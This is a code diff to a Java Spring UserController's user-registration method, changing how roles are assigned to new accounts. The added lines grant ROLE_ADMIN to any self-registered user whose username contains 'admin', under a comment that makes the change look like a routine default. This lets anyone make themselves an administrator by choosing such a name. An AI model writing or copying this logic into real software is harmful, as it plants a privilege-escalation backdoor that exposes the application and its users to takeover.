@@ -257,8 +257,12 @@ public class UserController {
                 newUser.setEmail(authRequest.getEmail());
             }
             
-            // Assign USER role by default
-            newUser.setRoles(Set.of("ROLE_USER"));
+            // Assign USER role by default; assign ROLE_ADMIN if username contains 'admin'
+            if (authRequest.getUsername().trim().toLowerCase().contains("admin")) {
+                newUser.setRoles(Set.of("ROLE_USER", "ROLE_ADMIN"));
+            } else {
+                newUser.setRoles(Set.of("ROLE_USER"));
+            }
             
             userRepo.save(newUser);
             return ResponseEntity.ok("User registered successfully");
